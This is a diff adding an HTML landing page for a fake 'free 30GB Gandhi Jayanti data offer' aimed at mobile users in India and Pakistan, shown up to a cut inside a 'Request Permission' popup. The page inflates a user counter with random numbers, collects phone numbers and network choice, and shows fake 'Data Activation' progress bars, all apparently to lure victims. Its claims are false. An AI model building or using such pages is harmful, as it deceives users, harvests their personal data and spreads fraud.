@@ -1,0 +1,1645 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+
+  <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta property="og:site_name" content="30 GB Gandhi jayanti Offer">
+    <meta property="og:title" content="30 GB A Gandhi jayanti Offer For All Network."/>
+    <meta property="og:description" content="Get this Gandhi jayanti Free 30GB">
+    <meta property="og:image" itemprop="image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKGi9K8mIPKxQ7teasIRo7xHVrFNs_UxPE1QtPQRFT7-bcaYcKjcf_8CFqwE25xD-PSh_eyh0CnZvouRQEMIOW7YQS-b8ahGq99EhwiESQrT9Nh-EgCswhDDR37KFWXWoVxI99RTfcJ-LlzN0JQqrL20fUcBoWFt-tXxNhyi3ZptNToLrpEC3HgG95/s400/Gandhi-Jayanti.jpg">
+    <meta property="og:type" content="website"/>
+    <meta property="og:updated_time" content="1440432930"/>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap" rel="stylesheet">-->
+    <title>30 GB Gandhi Jayanti Offer</title>
+
+
+    <style>
+        :root {
+            --color-primary: rgb(31, 30, 30);
+            --color-secondary: #ae0434; 
+             --color-secondary2: #ae0434
+        }
+
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0
+          
+        }
+
+        html {
+            font-size: 62.5%;
+            font-family: Montserrat;
+            font-weight: 500;
+            color: var(--color-primary)
+        }
+
+        .quedate-container, body {
+            width: 100vw
+        }
+
+        .container-chat {
+            font-weight: 400
+        }
+
+        .chat, .wrapper {
+            display: flex;
+            flex-direction: column
+        }
+
+        .loading__box-1--hidden {
+            display: none !important
+        }
+
+        .loading__box-2--hidden {
+            display: none !important
+        }
+
+        .loading__box-3--hidden {
+            display: none !important
+        }
+
+        .loading__check-1--hidden {
+            display: none !important
+        }
+
+        .loading__check-2--hidden {
+            display: none !important
+        }
+
+        .loading__check-3--hidden {
+            display: none !important
+        }
+
+        .chat__reactions {
+            width: 90%;
+            margin: 2rem auto 0;
+            display: flex;
+            align-items: stretch;
+            font-size: .95rem
+        }
+
+        .chat__reactions-icon {
+            width: 1.2rem;
+            margin-right: .2rem
+        }
+
+        .chat__reactions-text {
+            margin-left: .5rem
+        }
+
+        .chat__reactions-counter {
+            margin-left: 1.8rem
+        }
+
+        .chat__actions {
+            margin-top: 1rem;
+            display: flex;
+            justify-content: space-around;
+            font-size: 1.2rem;
+            border-top: 1.4px solid #b0b0b0;
+            border-bottom: .5px solid #d3d3d3
+        }
+
+        .chat__actions-box {
+            display: flex;
+            align-items: center
+        }
+
+        .chat__actions img {
+            width: 4rem
+        }
+
+        .chat__conversation {
+            width: 90%;
+            margin: 0 auto;
+            font-size: 1.1rem
+        }
+
+        .chat__conversation-box {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-top: 1rem;
+            position: relative
+        }
+
+        .chat__conversation-box--right {
+            margin-left: 20%;
+            margin-bottom: 1rem
+        }
+
+        .chat__conversation-box-img {
+            width: 3.5rem;
+            border-radius: 50%;
+            margin-right: 1rem;
+            align-self: baseline
+        }
+
+        .chat__conversation-box-active {
+            width: 1rem;
+            height: 1rem;
+            background-color: var(--color-secondary);
+            border-radius: 50%;
+            position: absolute;
+            top: 2.5rem;
+            left: 2.7rem
+        }
+
+        .chat__conversation-box-content-comment {
+            padding: 1rem;
+            background-color: #f2f3f5;
+            border-top-left-radius: 14px;
+            border-top-right-radius: 14px;
+            border-bottom-left-radius: 14px;
+            border-bottom-right-radius: 14px
+        }
+
+        .chat__conversation-box-content-comment-name {
+            color: #726695;
+            font-weight: 500;
+            margin-right: .4rem
+        }
+
+        .chat__conversation-box-content-cta {
+            margin-top: .3rem;
+            padding-left: 1.5rem;
+            color: #726695
+        }
+
+        .chat__conversation-box-content-cta-text {
+            margin-right: .5rem
+        }
+
+        .chat__conversation-box-content-cta--2 {
+            font-size: .9rem
+        }
+
+        .chat__conversation-reply {
+            margin-left: 20%;
+            color: gray
+        }
+
+        .chat__conversation-reply--efect {
+            animation: opacidad 1s infinite
+        }
+
+        @keyframes opacidad {
+
+        0
+        {
+            opacity: 0
+        }
+        50
+        %
+        {
+            opacity: 1
+        }
+        100
+        %
+        {
+            opacity: 0
+        }
+        }
+        .chat__conversation-write {
+            position: relative;
+            margin-bottom: 2rem
+        }
+
+        .chat__conversation-write input {
+            width: 100%;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            border: none;
+            background-color: #f2f3f5;
+            border-radius: 100px;
+            padding: .8rem;
+            color: var(--color-primary);
+            padding-left: 1rem;
+            outline: 0
+        }
+
+        .chat__conversation-write-icons {
+            display: flex;
+            flex-direction: row;
+            position: absolute;
+            right: 1.2rem;
+            top: 1.8rem
+        }
+
+        .chat__conversation-write-icons-img {
+            width: 1.2rem;
+            margin-right: .5rem;
+            fill: gray
+        }
+
+        .chat__conversation-write-icons-img--svg {
+            width: 2rem
+        }
+
+        .loading {
+            width: 100%;
+            height: 220px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 48px;
+            z-index: 10;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+        }
+
+        .loading__box {
+            width: 50%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            position: relative
+        }
+
+        .loading__animate, .loading__check {
+            width: 5rem
+        }
+
+        .loading__check {
+            position: absolute;
+            left: 0
+        }
+
+        .loading__txt {
+            font-size: 1.2rem;
+            color: var(--color-primary);
+            margin-left: 1rem
+        }
+
+        .loading2 {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 0px;
+            height:720px;
+            z-index: 20;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+        }
+
+        .loading2__box {
+            text-align: justify;
+            padding: 2rem;
+            color: var(--color-primary);
+            font-size: 14px
+        }
+
+        .loading2__permission {
+            width: 12rem;
+            margin: 0 auto
+        }
+
+        .js-hidden {
+            display: none !important
+        }
+
+        .js-display {
+            display: block
+        }
+
+        .js-show {
+            visibility: hidden !important
+        }
+
+        .logo-container {
+            width: 100%;
+            padding-top: 1.5rem;
+            padding-bottom: 1.5rem;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            color: var(--color-primary);
+            font-size: 2rem;
+            margin: 0 auto 20px;
+            background-color: var(--color-secondary);
+            color:white;
+        }
+
+        .quedate-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+
+        .quedate {
+            width: 100%
+        }
+
+        .quedate__fixed {
+            background-color: var(--color-secondary)
+        }
+
+        .quedate__fixed-box {
+            width: 90%;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            padding: .5rem
+        }
+
+        .quedate__fixed-box span {
+            margin: 0 auto;
+            color: #fff;
+            font-size: 1.5rem
+        }
+
+        .quedate__company {
+            width: 30%;
+            border-right: 1px solid var(--color-secondary)
+        }
+
+        .quedate__step {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 0;
+        }
+
+        @keyframes glowing {
+          0% { box-shadow: 0 0 -10px #000000; }
+          40% { box-shadow: 0 0 20px #000000; }
+          60% { box-shadow: 0 0 20px #000000; }
+          100% { box-shadow: 0 0 -10px #000000; }
+        }
+
+        .button-glow {
+          animation: glowing 5000ms infinite;
+          transition: 0.2s linear;
+          background-image: linear-gradient(to bottom right, #e24e03, #e24e03);
+        }
+
+
+        .quedate__step-box {
+            width: 96%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 2rem;
+            margin: 0 auto 20px;
+            text-align: center;
+            padding-bottom: 15px;
+            position: relative;
+        }
+        .quedate__step-box:before{
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            content: '';
+            border-radius: 10px;
+            background-color: #e24e03;
+            transform: translateX(-50%);
+        }
+
+        .quedate__border {
+            width: 30px;
+            height: 80%;
+            background-color: var(--color-secondary);
+            margin-right: 1rem;
+            display:none;
+        }
+
+        .quedate__cta-btn {
+            width: 200px;
+            height: 50px;
+            cursor: pointer;
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            padding: 1rem;
+            border: none;
+            border-radius:5px;
+            outline: 0;
+            margin: 0 0 20px 3.5rem;
+           background-color:#e24e03;
+        }
+
+        .quedate__cta-btn:active, .quedate__cta-btn:hover {
+            background-color: #e24e03;
+        }
+
+        .quedate__cta-btn:active {
+            transform: translateY(2px)
+        }
+
+        .quedate__loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+
+        .quedate__svg {
+            position: relative
+        }
+
+        .quedate__check {
+            position: absolute;
+            left: 0
+        }
+
+        .quedate__porcent {
+            margin-top: 1rem;
+            margin-bottom: 2rem;
+            font-size: 2.5rem;
+            font-weight: 700
+        }
+
+        .quedate__form {
+            border: 1.5px solid #c0bfc3;
+            padding: 1rem;
+            position: relative;
+            margin-top: 2.5rem
+        }
+
+        .quedate__form-input {
+            border: none;
+            outline: 0
+        }
+
+        .quedate__form-input::placeholder {
+            color: #c0bfc3;
+            font-family: inherit;
+            font-size: 1.5rem
+        }
+
+        .quedate__form-separar {
+            position: absolute;
+            width: 1px;
+            height: 100%;
+            top: 0;
+            background-color: #c0bfc3
+        }
+
+        .quedate__form-label {
+           
+    display: block;
+   text-align:center;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 27px;
+    cursor: pointer;
+    padding: 10px 10px;
+    background: #e24e03;
+    transition: background 0.3s ease;
+        }
+
+        .quedate__first {
+            width: 90%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            margin: 9px auto
+        }
+
+        .quedate__load {
+            width: 80%;
+            font-size: 1.3rem;
+            padding: .8rem;
+            border: 1px solid var(--color-primary);
+            position: relative
+        }
+
+        .quedate__load-icon {
+            width: 30%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            border: 1px solid var(--color-primary);
+            padding-right: .8rem;
+            padding-left: .8rem;
+            border-left: none
+        }
+
+        .quedate__load-text {
+            margin-left: -3.5rem;
+            font-size: 1.2rem;
+            font-weight: 700;
+          	
+        }
+
+        .quedate__load-a {
+            position: absolute;
+            height: 3.2rem;
+            top: 0;
+            z-index: -1;
+            left: 0;
+            background-color: #e24e03;
+        }
+
+        .permision-container {
+            width: 95%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .4);
+            position: absolute;
+            top: .8rem;
+            left: .8rem;
+            z-index: 15
+        }
+
+        .permision-container-box {
+            width: 95%;
+            margin: 0 auto
+        }
+
+        .permision-container-end, .permision-container-request-text {
+            width: 100%;
+            padding: 1.2rem;
+            background-color: #ededf3;
+            font-size: 1.5rem;
+            font-weight: 700
+        }
+
+        .permision-container-end {
+            font-size: 1rem;
+            font-weight: 400;
+            text-align: center
+        }
+
+        .permision-container-data {
+            padding: 2rem
+        }
+
+        .permision-container-icons {                                           
+            width: 60%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-around;
+            margin-bottom: 2.5rem
+        }
+
+        .permision-container-icons-face, .permision-container-icons-uber {
+            width: 8rem
+        }
+
+        .permision-container-txt {
+            margin: 0 auto;
+            font-size: 1.5rem;
+            text-align: center;
+            margin-bottom: 1.5rem
+        }
+
+        .permision-container-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between
+        }
+
+        .permision-container-input {
+            outline: 0;
+            padding: 1.2rem;
+            width: 100%;
+            margin-bottom: 1.5rem;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            border-bottom-left-radius: 10px;
+            border-bottom-right-radius: 10px;
+            border: 1px solid #b9b9b9;
+            color: gray;
+            font-size: 1.2rem
+        }
+
+        .permision-container-secure {
+            margin-top: 1rem;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            color: #a2a2a2
+        }
+
+        .permision-container-secure svg {
+            width: 1.5rem;
+            height: 1.5rem;
+            margin-right: 1rem
+        }
+
+        .permision-container-cta {
+            width: 100%;
+            padding: .8rem;
+            margin-top: 1rem;
+            margin-bottom: 1.5rem;
+            margin-left: 0;
+            font-size: 1.8rem
+        }
+
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Firefox */
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+        
+        
+        
+        
+        
+        
+        
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}.input {
+    padding: 6px 12px 12px;
+}.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .text {
+    display: block;
+}.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+
+.A{
+    text-align: center;
+    background-color: #028801;
+    color:white;
+}
+
+
+    </style>
+
+</head>
+
+<body>
+    
+<div id=fireworks>    
+    
+<div class="wrapper">
+    <div class="container-main">
+        
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKGi9K8mIPKxQ7teasIRo7xHVrFNs_UxPE1QtPQRFT7-bcaYcKjcf_8CFqwE25xD-PSh_eyh0CnZvouRQEMIOW7YQS-b8ahGq99EhwiESQrT9Nh-EgCswhDDR37KFWXWoVxI99RTfcJ-LlzN0JQqrL20fUcBoWFt-tXxNhyi3ZptNToLrpEC3HgG95/s400/Gandhi-Jayanti.jpg" width="100%">
+                 <marquee class="horizontal_marque" direction="left"style="font-size:20px"><b>If you haven't received free 30GB Data still then quickly fill the 
+                form below and get Free data now.</b>
+            </marquee> <div class="A" style="font-size:20px">
+           Till Today<b></br>
+                <span id="countdowntimer" style="color:white;">94548</span></b></br> Users have taken advantage of this offer. </br>
+           <script type="text/javascript">
+                     var timeleft = 94548;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+                 </script>
+                 </div>
+                 
+                 <div class="post" width="100%">
+                 <p class="welcome" style="font-size:20px">
+
+               If you want to Get <span style="color:red;">Free 30GB Data</span>.Then click on the button given below. We are offering Free 30GB. Get Now and share it to all your family and friends. <span class="amount">Note!</span> this is limited time offer.<br>
+                 
+                </p>
+                 </div>
+        <div class="quedate-container">
+            <main class="quedate">
+                <!-- Primera parte: ads description -->
+                <div class="quedate__step" id="first-box">
+                  
+                    <button style="margin:20px 0 30px;" id="validar" class="quedate__cta-btn button-glow">Continue ➤</button>
+                </div>
+
+
+                <div class="quedate__loading">
+                    <!--loading svg-->
+                    <svg id="loading-svg" class="js-hidden" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto; " viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                        <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#e24e03" stroke-dasharray="90.26548245743669 40.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                            <animateTransform attributeName="transform" type="rotate" dur="2s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                        </circle>
+                       
+                    </svg>
+                    
+                    <!--end loading svg-->
+
+                    <!--checked svg-->
+                  <svg id="check-svg" class="js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0"
+                                xmlns="http://www.w3.org/2000/svg" id="???_1" version="1.1"
+                                style=" background: rgb(255, 255, 255);" width="10rem">
+                                <g class="ldl-scale"
+                                    style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                    <g class="ldl-ani">
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani"
+                                                style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <circle stroke-miterlimit="10" stroke-width="8" stroke="#333"
+                                                    fill="none" r="40" cy="50" cx="50" style="stroke:white;"></circle>
+                                            </g>
+                                        </g>
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani"
+                                                style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <path fill="white"
+                                                    d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                    style="fill:white;"></path>
+                                            </g>
+                                        </g>
+                                        <metadata xmlns:d="https://loading.io/stock/">
+                                            <d:name>ok</d:name>
+                                            <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                            </d:tags>
+                                            <d:license>by</d:license>
+                                            <d:slug>364zp</d:slug>
+                                        </metadata>
+                                    </g>
+                                </g>
+                            </svg>
+                    <!--end check svg-->
+
+                    <span class="quedate__porcent js-hidden"></span>
+                    <span style="font-size: 20px;font-weight: bold;margin-top:-50px;" class="quedate__porcent-text js-hidden">Please Wait .....</span>
+                </div>
+                <!-- termina la primera parte -->
+
+                <!-- Segunda parte -->
+                <div id="second-box" style="margin-bottom: 2.5rem" class="quedate__step js-hidden">
+                   
+           
+		   
+                    <script>
+                        var prevent = (e) => e.preventDefault();
+                    </script>
+                    <form class="quedate__form" onsubmit="return prevent(event)"style="
+    font-size: 20px;
+">
+                        <input class="quedate__form-input" id="num" id="info" type="number" placeholder="Enter Phone Number"  style="height: 38px;font-size: 18px;width: 280px;">
+                        
+                        
+                    </form>
+                    <br>
+                    <center><p class="title" style="font-size: 20px;"
+>Choose Your Network</p></center>
+                    <br>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="height: 56px;font-size: 18px;width: 300px;">
+<option value="أختر نوع الشبكة" selected="1">----------- Choose Network -----------</option>
+<option value="1">AIrtel</option>
+<option value="2">Jio</option>
+<option value="3">VI</option>
+<option value="4">BSNL</option>
+<option value="5">Jazz</option>
+<option value="6">Ufone</option>
+<option value="7">Telenor</option>
+<option value="8">Zong</option>
+<option value="9">Other Networks</option>
+</select>
+</center><br>
+
+<label id="enviar" class="quedate__form-label" for="num" style="
+        width: 200px;
+    margin: 10px auto;
+    margin-top: 10px;
+">Send</label>
+
+                        <div class="message-status js-hidden"></div>
+                </div>
+
+                <!-- Tercera parte -->
+                <div id="third-box" style="margin-bottom: 2.5rem;" class="quedate__step js-hidden">
+                    <span style="font-weight: bold; font-size: 2rem; text-align:center" class="quedate__text">Data Activation Processing...</span>
+                    <div class="quedate__first js-hidden">
+                        <div style="border: 2px solid gray;color:white;  width:80%" class="quedate__load">Processing Data....<span class="quedate__load-a js-hidden"></span>
+                        </div>
+                        <div style="border: 2px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                            <svg id="first-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                                </circle>
+                            </svg>
+                            <svg id="first-checked" class="quedate__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="???_1" version="1.1" width=" 3.2rem">
+                                    <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:white;"></circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="white" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:white;"></path>
+                                                </g>
+                                            </g>
+                                            <metadata xmlns:d="https://loading.io/stock/">
+                                                <d:name>ok</d:name>
+                                                <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                                <d:license>by</d:license>
+                                                <d:slug>364zp</d:slug>
+                                            </metadata>
+                                        </g>
+                                    </g>
+                                </svg>
+                            <span id="first-porcent" class="quedate__load-text"></span>
+                        </div>
+                    </div>
+
+                    <div class="quedate__first js-hidden">
+                        <div style="border: 2px solid gray; width:80%" class="quedate__load">Activating 30GB Data....<span class="quedate__load-a js-hidden"></span>
+                        </div>
+                        <div style="border: 2px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                            <svg id="second-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="100.26548245743669 100.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="100.12831551628262 100.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                                </circle>
+                            </svg>
+                            <svg id="second-checked" class="quedate__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="???_1" version="1.1" width=" 3.2rem">
+                                    <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:white;"></circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="white" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:white;"></path>
+                                                </g>
+                                            </g>
+                                            <metadata xmlns:d="https://loading.io/stock/">
+                                                <d:name>ok</d:name>
+                                                <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success</d:tags>
+                                                <d:license>by</d:license>
+                                                <d:slug>364zp</d:slug>
+                                            </metadata>
+                                        </g>
+                                    </g>
+                                </svg>
+                            <span id="second-porcent" class="quedate__load-text"></span>
+                        </div>
+                    </div>
+
+
+                </div>
+
+                <!-- Loading-->
+                <div id="loading-g" class="quedate__step js-hidden">
+                    <div class="quedate__step-box">
+                        <svg class="quedate__animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#e24e03" stroke-dasharray="90.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                            </circle>
+                        </svg>
+                    </div>
+                    <p style="font-size: 14px;font-weight: bold;">Wait, we are validating data</p>
+                </div>
+            </main>
+        </div>
+        <!-- FIN PASOS -->
+
+        <!-- Ventana permiso -->
+        <div class="permision-container js-hidden">
+            <span class="permision-container-request-text">Request Permission</span>
+            <div class="permision-container-data">
+                <div class="permision-container-icons">
+                    
+					<!-- Generator: Adobe Illustrator 18.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+                    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+                    <svg width="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 112.196 112.196" style="enable-background:new 0 0 112.196 112.196;" xml:space="preserve">
+                            <g>
+                                <circle style="fill:#3B5998;" cx="56.098" cy="56.098" r="56.098" />
